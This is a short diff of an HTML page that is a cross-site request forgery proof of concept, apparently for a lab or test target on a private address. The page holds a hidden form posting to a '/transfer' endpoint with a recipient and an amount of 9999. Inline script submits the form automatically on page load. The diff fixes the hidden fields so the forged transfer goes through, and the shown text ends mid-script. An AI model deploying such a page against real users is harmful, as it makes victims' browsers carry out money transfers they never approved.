@@ -1,7 +1,8 @@
 <html>
   <body>
     <form action="http://192.168.2.98:55824/transfer" method="POST">
-      <input type="hidden" user_to="test" amount="999" />
+      <input type="hidden" name="user_to" value="test"/>
+      <input type="hidden" name="amount" value="9999"/>
     </form>
     <script>
       document.forms[0].submit();
